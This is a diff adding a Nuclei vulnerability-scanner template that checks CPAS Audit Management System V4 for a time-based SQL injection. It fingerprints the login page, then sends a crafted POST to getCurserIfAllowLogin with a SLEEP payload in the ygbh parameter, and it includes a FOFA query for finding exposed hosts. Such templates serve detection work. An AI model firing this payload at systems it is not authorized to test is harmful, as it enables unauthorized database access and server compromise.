@@ -1,0 +1,47 @@
+id: cpas-managment-sqli
+
+info:
+  name: CPAS Management System - SQL Injection
+  author: s4e-io
+  severity: high
+  description: |
+    The CPAS Audit Management System V4 has been identified with an SQL injection vulnerability in the getCurserIfAllowLogin endpoint. This flaw allows unauthenticated remote attackers to exploit the system by injecting malicious SQL queries. Through this vulnerability, attackers can retrieve sensitive data from the database and, under high-privilege circumstances, upload malicious payloads such as web shells to the server. This could potentially lead to a full compromise of the server's system. The vulnerability is triggered via a crafted HTTP POST request containing a malicious ygbh parameter, making it a critical issue that requires immediate remediation to protect the integrity of the system.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8F%8B%E6%95%B0%E8%81%9A%E7%A7%91%E6%8A%80/CPAS%E5%AE%A1%E8%AE%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FgetCurserIfAllowLogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="-58141038"
+  tags: cpas,cms,sqli,time-based-sqli
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /cpasm4/login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "/cpasm4/mobileQRCodeController/")'
+        internal: true
+
+  - raw:
+      - |
+        @timeout 20s
+        POST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        ygbh=q' AND (SELECT 1635 FROM (SELECT(SLEEP(7)))mlQT) AND 'qoYJ'='qoYJ
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=7'
+          - 'contains(content_type, "text/plain")'
+          - 'status_code == 200'
+        condition: and
+# digest: 490a00463044022068e308857171cb2658240470d0be0a1e3d11e31185887f3b576852abccfa8b7d02207a85344d1a4b013c46a7b9876e9af752d4012eb46eecce7af41182e99911ba15:922c64590222798bb761d5b6d8e72950
